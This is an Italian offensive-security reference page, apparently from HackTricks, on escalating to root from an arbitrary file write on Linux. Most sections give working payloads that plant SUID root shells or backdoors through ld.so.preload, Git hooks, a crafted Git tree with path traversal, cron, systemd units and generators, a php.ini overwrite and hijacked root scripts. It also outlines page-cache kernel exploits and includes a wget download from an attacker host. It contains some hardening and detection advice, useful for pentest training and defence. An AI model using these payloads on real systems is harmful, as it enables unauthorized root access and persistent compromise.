# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` è un elenco a livello di sistema di oggetti condivisi che il linker dinamico carica prima degli altri oggetti condivisi. La modalità di esecuzione sicura applica restrizioni aggiuntive al preloading, quindi un percorso di libreria come `/tmp/pe.so` non è una tecnica universale per i binari SUID.\
Se puoi creare o modificare questo file, un processo che lo carica caricherà la libreria elencata prima degli altri oggetti condivisi, consentendo l'esecuzione di codice nel contesto di quel processo.<sup>[[12]](#references)</sup>

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

I **Git hooks** sono script eseguibili eseguiti in occasione di eventi in un repository, incluse le operazioni di commit e merge. Se uno **script o un utente con privilegi** esegue tali azioni e un attacker può **scrivere nella cartella `.git`**, l’hook può essere utilizzato per una **privilege escalation**.<sup>[[13]](#references)</sup>

Ad esempio, è possibile **generare uno script** in un repository git nella cartella **`.git/hooks`**, in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal nell'esportazione di un Git tree privilegiato

Un synchronizer privilegiato può evitare un checkout e invece enumerare un repository controllato dall'attacker con `git ls-tree`, leggere ogni blob con `git cat-file`, concatenare il pathname riportato a una directory di staging e scriverlo autonomamente. Questo diventa una **scrittura arbitraria di file con i privilegi del synchronizer** quando combina `-c safe.directory=*` (disabilitando il controllo di Git sui repository appartenenti a un altro proprietario) con l'assenza di un controllo di contenimento della destinazione. Un nome assoluto di una tree entry fa sì che `os.path.join(stage, name)` di Python scarti `stage`; un nome relativo contenente `../` permette di uscire dalla directory quando il filesystem lo risolve. Poiché l'applicazione materializza il tree grezzo invece di chiedere a Git di eseguirne il checkout, il rifiuto dei pathname durante il checkout non protegge mai il sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Cerca questa struttura di codice nei servizi root, nei timer, negli agenti di deployment, negli importatori di template e nei job di backup/ripristino:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Una voce dell'albero è codificata come `<mode> SP <name> NUL <raw object ID>`. L'opzione `git hash-object --literally` consente deliberatamente dati dell'oggetto che il normale parsing o `git fsck` potrebbero rifiutare, quindi un clone usa-e-getta può costruire un albero il cui filename è una destinazione assoluta. Questo esempio crea un blob di un file cron, racchiude l'albero creato ad arte in un commit e sposta un branch su di esso; lo sfruttamento richiede comunque l'autorizzazione ad aggiornare un repository utilizzato dal job privilegiato e un Git server che accetti l'oggetto malformato.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
L’hardening deve coprire sia l’acquisizione dal repository sia l’operazione finale sul filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Sostituisci `safe.directory=*` con i repository esatti di cui il servizio deve fidarsi e, ove possibile, esegui l’elaborazione dei repository senza privilegi di root.
- Rifiuta i nomi assoluti e qualsiasi componente `.` o `..` prima della materializzazione. Dopo l’unione, canonicalizza e verifica che la destinazione rimanga all’interno della root prevista.
- Evita le race condition tra controllo e apertura dei symlink: apri i percorsi relativi a un file descriptor di directory attendibile e, su Linux, usa `openat2()` con `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` per i percorsi controllati dall’attaccante.
- Preferisci un checkout normale in una directory isolata invece di reimplementare il checkout dall’output plumbing. Se è necessaria l’acquisizione di raw object, abilita la validazione lato ricezione, ad esempio `receive.fsckObjects=true`; non ridurre i risultati `receive.fsck.*` relativi ai percorsi, necessari per rifiutare alberi creati ad hoc.

### File Cron e temporali

Se puoi **scrivere file relativi a cron che root esegue**, di solito puoi ottenere l’esecuzione di codice alla successiva esecuzione del job. Tra i target interessanti ci sono:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor nel target di un timer esistente** modificando lo script o il binario che avvia

Esempio minimale di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece un file eseguibile al suo interno:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i nomi di file contenenti punti, quindi preferisci nomi come `backup` invece di `backup.sh`.<sup>[[15]](#references)</sup>
- Alcuni sistemi usano i timer `systemd` invece del cron classico, ma l'idea dell'abuso è la stessa: **modificare ciò che root eseguirà in seguito**.<sup>[[20]](#references)</sup>

### File Service e Socket

Se puoi scrivere **file unit `systemd`** o i file a cui fanno riferimento, potresti riuscire a ottenere l'esecuzione di codice come root ricaricando e riavviando l'unità, oppure aspettando che il percorso di attivazione del service/socket venga attivato.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Tra i target interessanti ci sono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari del service referenziati da `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un service root

Controlli rapidi:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in un'unità di servizio di proprietà di root che puoi modificare
- **Aggiungere un override drop-in** con un `ExecStart=` dannoso e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già referenziato dall'unità
- **Dirottare un servizio attivato tramite socket** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override dannoso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare autonomamente i servizi ma puoi modificare un'unità attivata tramite socket, potresti dover solo **attendere una connessione client** per attivare l'esecuzione del servizio con backdoor come root.<sup>[[17]](#references)</sup>

### directory dei generatori di systemd

I **System generators** sono eseguibili avviati dal system manager prima del caricamento dei unit file, sia durante l'avvio sia durante i reload della configurazione. Pertanto, l'accesso in scrittura a una directory dei system-generator (o a un generator eseguibile esistente) è una primitiva diretta per l'esecuzione di codice come root, facile da non rilevare quando un audit controlla solo i file `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L'ordine di ricerca abituale è `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (alcune distribuzioni espongono `/lib/systemd/system-generators/` tramite l'unione di `/usr`). Un eseguibile con lo stesso nome in una directory precedente fa shadowing di quello successivo. Non confondere queste **input executable directories** con `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, che contengono l'output temporaneo delle unit prodotto dai generator.<sup>[[35]](#references)</sup>

Controlli rapidi:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Un generatore appena creato deve avere impostato il bit di esecuzione. Se la write primitive controlla i byte ma non la modalità, indirizza un generatore già eseguibile; troncarlo sul posto normalmente ne preserva i metadati. Se la directory stessa è scrivibile, crea una nuova voce e contrassegnala come eseguibile.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Attivare `systemctl daemon-reload` sul manager **system** richiede un'autorizzazione adeguata, ma riesegue ogni system generator; altrimenti attendi un reload con privilegi, un'operazione del package o un reboot. Le directory degli user-generator come `~/.config/systemd/user-generators/` vengono eseguite dal user manager e da sole **non** forniscono root.<sup>[[35]](#references)</sup>

Per l'hardening e la ricerca di minacce, verifica ogni componente del path e gli ACL, non solo i mode bit finali, crea una baseline degli hash e della proprietà dei package dei generator e genera alert per creazione, rinomina, modifiche al contenuto o ai permessi in tutte le directory di input dei system-generator. Monitorare la scrittura è importante perché un generator one-shot può eliminarsi dopo l'esecuzione, mentre l'albero delle unit generate in `/run/systemd/generator*` viene ricostruito al reload successivo.<sup>[[35]](#references)[[36]](#references)</sup>

### Sovrascrivere un `php.ini` restrittivo utilizzato da una sandbox PHP privilegiata

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (per esempio, `disable_functions=exec,system,...`). Se il codice in sandbox dispone ancora di **qualsiasi primitiva di scrittura** (come `file_put_contents`) e puoi raggiungere il **path esatto di `php.ini`** utilizzato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che viene eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue il codice dopo che le funzioni pericolose sono state nuovamente abilitate.

Esempio minimo (sostituisci il path utilizzato dal daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o convalida utilizzando percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Si tratta essenzialmente di una **privilege escalation tramite sovrascrittura della configurazione** quando il runtime in sandbox può ancora scrivere file.

### binfmt_misc

`binfmt_misc` espone le registrazioni in `/proc/sys/fs/binfmt_misc`; ogni registrazione associa un pattern di tipo file a un interprete. L'impatto sui privilegi dipende da chi può modificare la registrazione e da quale processo esegue in seguito il file corrispondente, quindi verifica questi requisiti prima di considerarlo un possibile percorso di privilege escalation.<sup>[[21]](#references)</sup>

### Sovrascrivere i gestori degli schemi (come http: o https:)

Gli ambienti desktop utilizzano associazioni MIME e voci desktop per scegliere un'applicazione per gli schemi URI; un attacker che può scrivere nella configurazione per-user pertinente e nelle directory delle voci desktop può reindirizzare tali schemi verso un launcher sotto il suo controllo. Modificando il file `$HOME/.config/mimeapps.list` per associare i gestori degli URL HTTP e HTTPS a un file malevolo (ad esempio, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), un clic dell'utente può invocare quella voce desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root che esegue script/binary modificabili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binary all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con pspy per intercettare Root che invoca percorsi controllati dall'utente.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file di destinazione sia la sua directory siano di proprietà del tuo utente e scrivibili.
- **Hijack del target:** esegui il backup del binario/script originale e inserisci un payload che crei una shell SUID (o esegua qualsiasi altra azione root), quindi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad esempio, premendo un pulsante dell'interfaccia che avvia l'helper). Quando root riesegue il percorso hijacked, ottieni la shell escalated con `./rootshell -p`.

### Modifica dei file dei soli page cache dei binari privilegiati

Alcuni bug del kernel non modificano il file **sul disco**. Permettono invece di modificare solo la **copia nel page cache di un file leggibile**. Se puoi colpire un binario **setuid** o comunque **eseguito da root**, l'esecuzione successiva può utilizzare byte controllati dall'attaccante presenti in memoria ed eseguire un privilege escalation, anche se l'hash del file sul disco non è cambiato.<sup>[[3]](#references)[[4]](#references)</sup>

È utile considerarlo come una **primitiva di scrittura di file valida solo a runtime**:<sup>[[3]](#references)</sup>

- **Il disco rimane pulito**: l'inode e i byte sul disco non cambiano
- **La memoria è modificata**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attaccante
- **L'effetto è temporaneo**: la modifica scompare dopo un reboot o l'espulsione dalla cache

Questa primitiva si colloca tra la classica **arbitrary file write** e i più vecchi bug di **page-cache abuse**, come Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitiva basata solo sul page cache può essere più affidabile se il percorso vulnerabile consente scritture dirette nelle pagine cached supportate da file

#### Flusso generico di privesc

1. Ottieni una primitiva del kernel in grado di scrivere nelle **pagine del page cache supportate da file**
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l'esecuzione **prima** che la pagina venga espulsa dalla cache
4. Ottieni code execution come root mentre il file sul disco appare ancora non modificato

Target tipici ad alto valore:

- binari **setuid-root**
- Helper avviati da **servizi root**
- Binari eseguiti comunemente da **container che condividono il kernel/page cache dell'host**

#### Percorso di esempio AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il percorso vulnerabile si trovava nell'API userspace crypto di Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può spostare riferimenti a pagine del page cache da un file leggibile nella scatterlist TX della crypto
- il percorso di decrypt in-place di `algif_aead` riutilizzava i buffer di origine e destinazione
- `authencesn` scriveva quindi nella regione del tag di destinazione
- quando quella regione faceva ancora riferimento a pagine supportate da file ottenute tramite splice, la scrittura finiva nel **page cache del file target**

La tecnica interessante non è quindi la CVE in sé, ma il pattern:

- **inserire pagine di cache supportate da file in un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare un overwrite controllato di piccole dimensioni in memoria

Il PoC pubblico utilizzava scritture ripetute di **4 byte** per modificare `/usr/bin/su` in memoria e poi lo eseguiva.<sup>[[4]](#references)[[7]](#references)</sup>

#### Percorso di esempio ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso pattern di **page-cache-only write-to-root**, ma questa volta il sink è il **decrypt IPsec ESP** invece di `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica importante è il **passaggio di metadata-laundering**:

- `splice()` inserisce una **pagina del page cache di un file in sola lettura** in un pacchetto ESP-in-UDP
- la mitigazione DirtyFrag originale contrassegnava quello skb con `SKBFL_SHARED_FRAG`, in modo che `esp_input()` eseguisse una **copia prima del decrypt**
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone conserva lo **stesso riferimento fisico alla pagina del page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi il clone sicuro ed esegue il decrypt **in-place** `cbc(aes)` sulla pagina supportata dal file

La lezione per il reviewer è più ampia della CVE: se una mitigazione dipende dai **metadata di skb/pagina** per decidere se un'operazione deve prima eseguire una copia, qualsiasi **percorso di clone/copia che conservi la pagina sottostante ma rimuova i metadata** può riaprire silenziosamente la primitiva di scrittura.

Flusso tipico di exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un private network namespace**
2. attiva il loopback e installa una regola **netfilter `TEE`** in `mangle/OUTPUT`
3. installa SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target di 4 byte nel campo `seq_hi` della SA (il word-selection trick di DirtyFrag)
5. invia il pacchetto ESP-in-UDP ottenuto tramite splice, in modo che il **clone TEE** raggiunga `esp_input()` ed esegua il decrypt **in-place**
6. ripeti finché la copia nel page cache di `/usr/bin/su` o di un altro executable privilegiato contiene codice controllato dall'attaccante

Dal punto di vista operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file sul disco rimane pulito, ma `execve()` utilizza i **byte modificati del page cache** e restituisce root.<sup>[[8]](#references)[[9]](#references)</sup>

Controlli utili dell'exposure per questa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La riduzione a breve termine della attack surface è anch'essa specifica al path: l'upgrade a un kernel che include `48f6a5356a33` risolve il clone path, mentre il blocco dell'autoload di `xt_TEE` rimuove il **flag-laundering step** e il blocco di `esp4` / `esp6` rimuove il **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Esposizione e hunting

Se sospetti questa classe di bug, non fare affidamento solo sui controlli di integrità del disco. Verifica anche:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
I valori di configurazione riportati di seguito distinguono un’interfaccia caricabile da una integrata nel kernel; le regole di compilazione crypto associano `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato/scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l’interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che agisce solo sulla page cache può essere sufficiente per trasformare un foothold locale in root

#### Riduzione della attack surface per il percorso `algif_aead`

Se l’interfaccia vulnerabile è fornita da un modulo caricabile:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se è compilato nel kernel, alcune divulgazioni hanno segnalato il blocco del percorso init con:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione è utile da ricordare anche per altri kernel LPE: se l'exploitation dipende da una specifica interfaccia opzionale, disabilitare o mettere in blacklist tale interfaccia può interrompere il percorso di exploit persino prima che sia disponibile un aggiornamento completo del kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking di uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ su Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Disclosure di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Fix di Linux stable: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory per CVE-2026-31431](https://copy.fail/)
- [7] [Technical writeup di Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README di DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e exploitation della variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Fix di Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione precedente di Linux: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — pagina del manuale Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentazione del Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associazioni delle applicazioni MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifiche delle informazioni MIME condivise](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifiche delle Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguaggio Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto di Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilità della page cache di AF_ALG nel Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentazione di Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentazione di Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentazione della configurazione di Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentazione dei generator di systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: meccanismi di persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
